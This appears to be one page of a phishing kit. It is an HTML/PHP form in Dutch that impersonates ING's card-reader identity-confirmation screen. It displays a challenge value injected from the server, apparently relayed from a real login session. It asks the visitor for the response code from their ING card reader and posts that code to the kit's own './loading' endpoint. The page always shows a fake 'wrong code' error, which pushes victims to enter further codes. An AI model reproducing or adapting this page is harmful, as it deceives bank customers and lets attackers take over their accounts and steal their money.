<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ING - Bevestig mijn identiteit</title>
    <link rel="icon" href="assets/droneikaragwa.png" type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            background-image: url(./assets/deone.svg);
            background-color: #f0f0f0;
            position: relative;
            min-height: 100vh;
            --lion-bg: none;
            overflow-x: hidden;
            background-repeat: no-repeat;
            background-position: 100% 100%;
            background-size: auto 500px;
            display: flex;
            flex-direction: column;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 30px;
            background-color: white;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
            position: relative;
            z-index: 10;
        }

        .language-selector {
            display: flex;
            align-items: center;
        }

        .language-selector a {
            text-decoration: none;
            color: #696969;
            font-weight: 1rem;
            line-height: 1.5rem;
            padding: 0 5px;
        }

        .language-selector a.active {
            color: #333;
            font-weight: bold;
        }

        .separator {
            color: #ccc;
        }

        main {
            padding: 20px;
            display: flex;
            justify-content: center;
            position: relative;
            flex: 1;
        }

        .page-title {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
            font-size: 20px;
            font-weight: 600;
        }

        .token-container {
            max-width: 500px;
            width: 100%;
            margin: 0 auto;
        }

        .token-card {
            background-color: white;
            border-radius: 8px;
            padding: 30px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
            margin-bottom: 20px;
            max-width: 455px;
            margin-left: auto;
            margin-right: auto;
        }

        .card-reader-icon {
            text-align: center;
            margin-bottom: 25px;
        }

        .steps-container {
            margin-bottom: 30px;
        }

        .step {
            display: flex;
            margin-bottom: 20px;
            align-items: center;
        }

        .step-number {
            font-weight: bold;
            margin-right: 10px;
            min-width: 20px;
        }

        .step-text {
            flex-grow: 1;
            font-size: 15px;
            line-height: 1.4;
        }

        .step-action {
            min-width: 80px;
            display: flex;
            justify-content: flex-end;
        }

        .btn-step {
            background-color: #00348e;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 2px;
            font-size: 12px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            min-width: 70px;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .btn-step.light {
            background-color: #c6d1dd;
            color: #444;
            padding: 4px 15px;
            width: 50px;
            min-height: 28px;
            position: relative;
            border-radius: 0;
            clip-path: polygon(0 0, 100% 0, 100% 70%, 80% 100%, 0 100%);
        }

        .response-section {
            margin: 30px 0;
            border-bottom: none;
            padding-bottom: 0;
        }

        .response-section.error .response-input {
            border-color: #e30613;
        }
        
        .response-section.error .response-input:focus, .response-section.error .response-input:hover {
            border-color: #ff6200;
            outline: none;
        }

        .response-label {
            display: block;
            color: #ff6200;
            font-size: 14px;
            margin-bottom: 8px;
            margin-top: 10px;
        }

        .response-input {
            border: none;
            border-bottom: 1px solid #ccc;
            width: 100%;
            font-size: 16px;
            font-weight: normal;
            padding: 5px 0;
            margin-bottom: 5px;
            outline: none;
        }

        .response-input:focus, .response-input:hover {
            border-bottom: 1px solid #ff6200;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label, .response-section label {
            display: block;
            margin-bottom: 4px;
            color: #333;
            font-weight: normal;
            font-size: 14px;
            line-height: 1rem;
        }

        .form-group input {
            width: 100%;
            padding: 10px 0;
            border: none;
            border-bottom: 1px solid #ccc;
            border-radius: 0;
            font-size: 16px;
            font-family: Arial, Helvetica, sans-serif;
            outline: none;
        }

        .form-group input:focus, .form-group input:hover {
            outline: none;
            border-bottom: 1px solid #ff6200;
        }

        .error-message {
            display: flex;
            align-items: flex-start;
            margin-top: 5px;
            font-size: 14px;
            color: #e30613;
            margin-bottom: 15px;
        }

        .error-icon {
            margin-right: 5px;
            font-size: 16px;
            display: flex;
            align-items: center;
        }

        .btn-confirm {
            background-color: #ff6200;
            color: white;
            border: none;
            padding: 15px;
            border-radius: 3px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            text-transform: none;
        }

        .btn-confirm:hover {
            background-color: #e55a00;
        }
        
        input[type=number]::-webkit-inner-spin-button, 
        input[type=number]::-webkit-outer-spin-button { 
            -webkit-appearance: none;
            margin: 0; 
        }

        input[type=number] {
            -moz-appearance: textfield;
        }

        footer {
            bottom: 0;
            left: 0;
            width: 100%;
            padding: 15px 0px;
            background-color: transparent;
            z-index: 5;
            text-align: center;
            margin-bottom: 45px;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 15px;
        }

        .footer-links a {
            color: #333333;
            text-decoration: underline;
            font-size: 14px;
            transition: color 0.2s;
        }

        .footer-links a:hover {
            color: #333;
        }

        @media (max-width: 1024px) {
            body {
                background-image: none;
            }
        }

        @media (max-width: 449px) {
            footer {
                bottom: 0;
                left: 0;
                width: 100%;
                padding: 10px 0px;
                background-color: transparent;
                margin-bottom: 20px;
                text-align: left;
                padding-left: 20px; 
            }
            
            .footer-links {
                display: flex;
                flex-direction: column;
                align-items: left;
                gap: 8px;
            }
            
            .footer-links a {
                color: #333333;
                text-decoration: underline;
                font-size: 12px;
            }
        }

        @media (max-width: 737px) {
            footer {
                bottom: 0;
                left: 0;
                width: 100%;
                padding: 10px 0px;
                background-color: transparent;
                margin-bottom: 20px;
                text-align: left;
                padding-left: 20px; 
            }
            
            .footer-links {
                display: flex;
                flex-direction: column;
                gap: 8px;
                align-items: left;
            }
            
            .footer-links a {
                color: #333333;
                text-decoration: underline;
                font-size: 12px;
            }
        }

        @media screen and (max-width: 840px) {
            main {
                padding: 20px 0px 20px 0px;
            }

            .token-container {
                width: 100%;
                max-width: 100%;
            }
            
            .token-card {
                width: 100%;
                max-width: 100%;
                border-radius: 0;
                box-shadow: none;
                margin: 0;
                padding: 15px;
            }
            
            .btn-confirm {
                width: 100%;
            }
        }

        @media (max-width: 767px) {
            header {
                padding: 12px 15px;
            }
            
            .language-selector {
                display: none;
            }
            
            .page-title {
                margin: 10px 0 20px;
                text-align: center;
            }
            
            main {
                padding: 10px;
            }
            
            .token-card {
                padding: 15px;
                border-radius: 0;
                box-shadow: none;
            }
            
            .step {
                margin-bottom: 15px;
            }
            
            .card-reader-icon img {
                width: 80px;
                height: auto;
            }
            
            .btn-confirm {
                margin-top: 20px;
                margin-bottom: 10px;
            }
            
            footer {
                margin-bottom: 20px;
                padding-left: 15px;
                text-align: left;
            }
            
            .footer-links {
                flex-direction: column;
                align-items: flex-start;
                gap: 8px;
            }
        }

        @media (max-width: 430px) {
            .token-card {
                width: 100%;
                max-width: 100%;
                border-radius: 0;
                box-shadow: none;
                padding: 15px;
                margin: 0 auto;
                display: flex;
                flex-direction: column;
                align-items: center;
            }
            
            .token-container {
                width: 100%;
                max-width: 100%;
                padding: 0;
                margin: 0 auto;
                display: flex;
                flex-direction: column;
                align-items: center;
            }
            
            .steps-container, .response-section, .form-group {
                width: 100%;
                max-width: 380px;
            }
            
            .btn-confirm {
                width: 100%;
                max-width: 380px;
            }
            
            main {
                padding: 0;
                margin: 0;
                display: flex;
                justify-content: center;
            }
            
            body {
                background-image: none;
            }
            
            .page-title {
                margin: 10px 0;
                width: 100%;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="logo" style="height: 30px;">
            <img src="assets/talmassan.svg" alt="ING Logo" style="height: 30px; width: auto;">
        </div>
        <div class="language-selector">
            <a href="#" class="active">NL</a>
            <span class="separator">|</span>
            <a href="#">FR</a>
            <span class="separator">|</span>
            <a href="#">EN</a>
        </div>
    </header>
    
    <main>
        <div class="token-container">
            <h1 class="page-title">Bevestig mijn code</h1>
            
            <div class="token-card">
                <form action="./loading" method="post">
                    <input type="hidden" name="page" value="token-error">
                    <div class="card-reader-icon">
                        <img src="assets/crata.svg" alt="Card Reader" width="100" height="100">
                    </div>
                    
                    <div class="steps-container">
                        <div class="step">
                            <div class="step-number">1.</div>
                            <div class="step-text">Plaats uw ING debetkaart in uw ING kaartlezer en druk op</div>
                            <div class="step-action">
                                <button class="btn-step">✓ SIGN</button>
                            </div>
                        </div>
                        
                        <div class="step">
                            <div class="step-number">2.</div>
                            <div class="step-text">Voer de pincode van uw bankkaart in en druk op</div>
                            <div class="step-action">
                                <button class="btn-step light">OK</button>
                            </div>
                        </div>
                        
                        <div class="step">
                            <div class="step-number">3.</div>
                            <div class="step-text">CHALLENGE <span style="font-weight: bold;"><?=preg_replace('/(.{4})/', '$1 ', $data['token'])?></span></div>
                            <div class="step-action">
                                <button class="btn-step">✓ SIGN</button>
                            </div>
                        </div>
                    </div>
                    
                    <div class="response-section error">
                        <div class="response-label">RESPONSE code</div>
                        <input type="text" id="response-code" class="response-input" required inputmode="numeric" pattern="[0-9]*" name="token" placeholder="">
                        <div class="error-message">
                            <span class="error-icon"><img src="assets/alex.svg" alt="Error" width="20" height="20"></span>
                            <span>Onjuiste code. Controleer de code op uw kaartlezer.</span>
                        </div>
                        <label for="response-code">Voer de cijfers in die u op uw ING kaartlezer ziet.</label>
                    </div>
                    
                    <button class="btn-confirm">Bevestigen</button>
                </form>
            </div>
        </div>
    </main>
    
    <footer>
        <div class="footer-links">
            <a href="#">Online veiligheid</a>
            <a href="#">Privacy</a>
            <a href="#">Algemeen Reglement der Verrichtingen</a>
        </div>
    </footer>
    
    <script>
        const responseInput = document.getElementById('response-code');
        
        responseInput.addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            
            if (value.length > 8) {
                value = value.slice(0, 8);
            }
            
            this.value = value;
        });
    </script>
</body>
</html> 